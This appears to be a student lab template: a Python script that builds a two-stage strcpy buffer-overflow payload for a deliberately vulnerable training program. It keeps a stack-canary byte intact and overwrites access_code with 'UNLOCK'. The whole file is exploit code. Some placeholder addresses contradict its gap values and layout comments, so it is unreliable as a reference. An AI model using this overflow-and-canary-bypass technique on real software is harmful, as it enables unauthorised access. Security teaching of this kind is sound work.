#!/usr/bin/python3
import sys

def p32(x):
    """Pack a 32-bit integer in little-endian format."""
    return x.to_bytes(4, byteorder='little')

# ============================================================
# TODO: Fill in the values below based on your GDB analysis
# ============================================================

# Your Student ID (last 3 digits)
STUDENT_ID = 4               # TODO: Replace with your ID

# Canary value (derived from Student ID)
CANARY_VAL = 0xDEAD0000 + STUDENT_ID + 16

# Addresses (found via GDB)
username_addr = 0x565590c0    # TODO: p &username
canary_addr = 0x565590a0      # TODO: p &canary_guard
profile_addr = 0x56559040     # TODO: p &profile
access_code_addr = 0x56559080 # TODO: p &access_code

# ============================================================
# Understanding the Null-Byte Problem
# ============================================================
# CANARY_VAL in little-endian contains a \x00 byte (2nd byte).
# strcpy() stops copying at \x00, so you CANNOT write past
# the canary in a single overflow!
#
# Solution: Use the TWO strcpy() calls in the program.
#
# Stage 1 — strcpy(username, line1):
#   Overflow username up to the canary. strcpy's null terminator
#   naturally lands on the canary's \x00 byte, preserving it.
#   But you CANNOT reach access_code past the canary.
#
# Stage 2 — strcpy(profile, line2):
#   profile sits AFTER the canary. Overflow profile into
#   access_code to write "UNLOCK". The canary is not in the way.
#
# Your badfile must have TWO LINES separated by \n.
# ============================================================

# Gaps (calculate from GDB addresses)
gap1 = 32  # TODO: canary_addr - username_addr
gap2 = 64  # TODO: access_code_addr - profile_addr

# ============================================================
# Construct the payload (two lines)
# ============================================================

# Stage 1: overflow username, preserve canary
# "admin" + padding + first_canary_byte
canary_byte0 = CANARY_VAL & 0xFF # (the low byte)
padding1_size = gap1 - len("admin")

line1 = b"admin" + b"A" * padding1_size + bytes([canary_byte0])

# Stage 2: overflow profile into access_code
# padding2_size = gap2 - len("some_profile_data")


# line2 = b"B" * padding2_size + b"UNLOCK"
line2 = b"B" * gap2 + b"UNLOCK"

# Combine with newline separator
payload = line1 + b"\n" + line2 + b"\n"

# ============================================================
# Write the payload to badfile
# ============================================================
with open('badfile', 'wb') as f:
    f.write(payload)

print("badfile generated successfully!")
